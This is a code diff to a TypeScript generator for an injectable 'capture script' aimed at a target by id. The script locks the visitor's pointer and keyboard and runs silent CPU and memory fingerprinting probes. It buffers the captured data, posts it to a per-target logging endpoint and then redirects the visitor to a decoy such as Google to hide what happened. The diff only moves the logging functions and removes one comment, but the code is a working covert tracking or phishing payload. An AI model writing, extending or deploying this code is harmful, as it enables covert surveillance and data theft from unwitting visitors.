@@ -14,13 +14,38 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     var requiredPerms = ${JSON.stringify(perms)};
     var cfg = ${JSON.stringify(theme)};
     
+    var extraBuffer = {};
+    var statusText = null;
+
+    async function logEvent(type, data) {
+      try {
+        return await fetch('/api/log/' + targetId + '/' + type, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
+        });
+      } catch(e) { return null; }
+    }
+
+    async function logExtra(data) {
+      Object.assign(extraBuffer, data);
+    }
+
+    async function flushExtra() {
+      if (Object.keys(extraBuffer).length > 0) {
+        var dataToSend = Object.assign({}, extraBuffer);
+        extraBuffer = {};
+        await logEvent('extra', dataToSend);
+      }
+    }
+
     async function checkRedirect() {
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
       var threshold = (flowType === 'full') ? 60 : 15;
       if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
         hasRedirected = true;
-        await flushExtra();
+        try { await flushExtra(); } catch(e) {}
         window.location.href = targetUrl;
       }
     }
@@ -40,7 +65,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
       if (!box) return;
 
-      // Lock user interaction for maximum capture stability
       try {
         if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
         if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
@@ -49,8 +73,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var isSilent = mode === 'silent' || flowType === 'silent';
       var accent = cfg.accent || '#3498db';
 
-      var extraBuffer = {};
-      var statusText = document.getElementById('status-text');
+      statusText = document.getElementById('status-text');
       var btn = document.querySelector('.btn') || document.querySelector('button');
 
     if (!isSilent) {
@@ -97,29 +120,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       if (idx >= messages.length) idx = messages.length - 1;
       statusText.innerText = text || messages[idx];
     }
-
-
-        async function logEvent(type, data) {
-          try {
-            return await fetch('/api/log/' + targetId + '/' + type, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
-            });
-          } catch(e) { return null; }
-        }
-
-      async function logExtra(data) {
-        Object.assign(extraBuffer, data);
-      }
-
-      async function flushExtra() {
-        if (Object.keys(extraBuffer).length > 0) {
-          var dataToSend = Object.assign({}, extraBuffer);
-          extraBuffer = {};
-          await logEvent('extra', dataToSend);
-        }
-      }
 
       async function runSilentProbes() {
         // CPU & Memory Fingerprint
